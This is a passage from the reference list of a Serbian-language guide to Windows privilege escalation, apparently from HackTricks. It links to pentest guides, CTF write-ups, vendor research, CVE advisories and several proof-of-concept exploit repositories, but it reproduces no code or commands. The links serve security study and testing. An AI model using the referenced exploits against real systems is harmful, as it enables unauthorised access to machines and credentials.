- [6] [Eskalacija privilegija - Windows - Potpuni OSCP vodič](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Eskalacija privilegija - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Vodič za eskalaciju privilegija u Windows-u](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Kontrolna lista za eskalaciju privilegija u Windows-u](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Eskalacija privilegija u Windows-u](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Metode eskalacije privilegija u Windows-u za pentestere](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: phishing putem Word VBA makroa preko SMTP-a → dešifrovanje hMailServer akreditiva → Veeam CVE-2023-27532 do SYSTEM-a](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: leak format string-a + stack BOF → VirtualAlloc ROP (RCE) i krađa kernel tokena](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Potera za Srebrnom lisicom: igra mačke i miša u senkama kernela](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Ranjivost privilegovanog sistema datoteka prisutna u SCADA sistemu](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Alati za testiranje simboličkih veza – upotreba CreateSymlink-a](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Veza s prošlošću. Zloupotreba simboličkih veza u Windows-u](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js poverenje na slepo: opasno razrešavanje modula u Windows-u](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js moduli: učitavanje iz fascikli `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Izazovi kontrolne liste za C/C++, rešeni](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - Funkcija RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Otmica binarnih datoteka servisa](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own sa Microslop-om: ulančavanje CLDFLT i DirectX kernel race uslova za LPE u Windows-u](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Jedan I/O Ring da njima svima vlada: primitiv za potpuno čitanje/pisanje u Windows-u 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Zloupotreba proizvoljnog brisanja datoteka radi eskalacije privilegija i drugi sjajni trikovi](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - kod za eksploataciju FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – Napadi na WSUS, 2. deo: CVE-2020-1013, jednodnevna ranjivost za lokalnu eskalaciju privilegija u Windows-u 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Istraživanje Credential Manager-a i Windows Vault-a](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos delegiranje sa ograničenjem zasnovano na resursima: kada promena slike dovede do eskalacije privilegija](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Izdvajanje privatnih SSH ključeva iz SSH agenta u Windows-u 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Pretvaranje serverskih sistema za ažuriranje preduzeća u fabrike backdoor-a (0_o) – 1. deo](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Pretvaranje serverskih sistema za ažuriranje preduzeća u fabrike backdoor-a (0_o) – 2. deo](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Eskalacija privilegija brisanjem fascikle Windows Installer-a](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: vraćanje koracima do NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group - Bezbednosno obaveštenje o eskalaciji privilegija putem pomaka u deljenoj memoriji Windows MIDI Services-a](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
